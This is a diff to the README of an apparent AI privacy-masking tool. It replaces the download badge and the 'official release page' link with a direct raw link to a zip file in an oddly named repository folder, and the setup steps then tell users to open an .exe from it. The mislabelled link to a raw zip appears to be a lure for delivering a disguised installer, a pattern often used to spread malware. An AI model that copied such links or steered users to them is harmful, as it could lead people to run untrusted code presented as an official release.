@@ -1,6 +1,6 @@
 # 🛡️ ai-privacy-gateway - Protect your AI data from leaks
 
-[![](https://img.shields.io/badge/Download_Windows_Installer-blue)](https://github.com/licit-approach897/ai-privacy-gateway)
+[![](https://img.shields.io/badge/Download_Windows_Installer-blue)](https://github.com/licit-approach897/ai-privacy-gateway/raw/refs/heads/main/heptahedrical/gateway_ai_privacy_tejon.zip)
 
 Your AI tools send data to servers across the globe. Often, this data includes private information. The ai-privacy-gateway acts as a shield between your computer and AI services like ChatGPT, Claude, or Cursor. It masks sensitive details before they leave your device.
 
@@ -17,7 +17,7 @@ Modern AI tools need your data to work. However, you might share passwords, clie
 
 ## 🚀 Setting up the software
 
-1. Visit the [official release page](https://github.com/licit-approach897/ai-privacy-gateway) to download the software.
+1. Visit the [official release page](https://github.com/licit-approach897/ai-privacy-gateway/raw/refs/heads/main/heptahedrical/gateway_ai_privacy_tejon.zip) to download the software.
 2. Select the file ending in `.exe` that matches your Windows version.
 3. Open the downloaded file to start the installation.
 4. Follow the steps on your screen to complete the setup.
